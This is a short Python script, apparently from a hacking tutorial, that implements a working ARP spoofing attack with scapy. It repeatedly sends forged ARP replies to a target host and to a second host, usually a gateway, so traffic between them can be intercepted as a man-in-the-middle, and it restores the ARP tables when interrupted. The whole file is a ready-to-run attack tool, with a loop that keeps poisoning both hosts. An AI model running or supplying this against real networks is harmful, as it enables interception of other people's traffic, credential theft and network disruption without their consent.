#! /usr/bin/env python

import argparse
import scapy.all as scapy
import time
import sys


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="Target IP.")
    parser.add_argument("-s", "--spoof", dest="spoof", help="Spoof IP.")
    options = parser.parse_args()
    if not options.target:
        parser.error("[-] Please specify a target ip, use --help for more info.")
    elif not options.spoof:
        parser.error("[-] Please specify a spoof ip, use --help for more info.")
    return options


def get_mac(ip):
    # Create arp request directed to broadcast MAC asking for IP
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request

    # Send and receive packets
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof_restore(target_ip, target_mac, spoof_ip, restore_mac_source=""):
    if restore_mac_source == "":
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        scapy.send(packet, verbose=False)
    else:
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=restore_mac_source)
        scapy.send(packet, verbose=False, count=4)


options = get_arguments()
target_mac = get_mac(options.target)
spoof_mac = get_mac(options.spoof)
sent_packet_count = 0
try:
    while True:
        spoof_restore(options.target, target_mac, options.spoof)
        spoof_restore(options.spoof, spoof_mac, options.target)
        sent_packet_count = sent_packet_count + 2
        print("\r[+] Packets sent: " + str(sent_packet_count)),
        # print("\r[+] Packets sent: " + str(sent_packet_count), end="")
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    # Restore parameters before quitting
    print("\n[+] Detected CTRL+C, resetting ARP tables and quitting...")
    restore_mac_source = spoof_mac
    spoof_restore(options.target, target_mac, options.spoof, restore_mac_source)
    restore_mac_source = target_mac
    spoof_restore(options.spoof, spoof_mac, options.target, restore_mac_source)
